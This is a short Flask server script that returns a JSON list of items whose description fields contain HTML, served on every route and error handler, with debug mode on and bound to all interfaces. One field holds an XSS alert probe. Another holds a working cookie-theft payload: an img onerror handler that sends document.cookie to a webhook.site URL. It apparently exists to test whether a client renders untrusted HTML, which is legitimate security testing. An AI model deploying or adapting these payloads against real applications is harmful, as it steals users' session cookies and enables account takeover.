from flask import Flask, jsonify, make_response

app = Flask(__name__)

data = [
    {
        "name": "Whale",
        "descript": "<img src='x' onerror='alert(1)'></img>"
    },
    {
        "name": "Eating",
        "descript": "<h1>Yummy</h1>"
    },
    {
        "name": "Corn",
        "descript": '<img src=\'x\' onerror=\'fetch("https://webhook.site/53b6d2f1-382a-4fee-8bd4-ed14edadf9d6?"+document.cookie);\'></img>'
    }
]

@app.route('/')
def index():
    return jsonify(data)

@app.errorhandler(404)
def not_found(error):
    response = make_response(jsonify(data), 404)
    return response

@app.errorhandler(Exception)
def handle_exception(e):
    response = make_response(jsonify(data), 500)
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
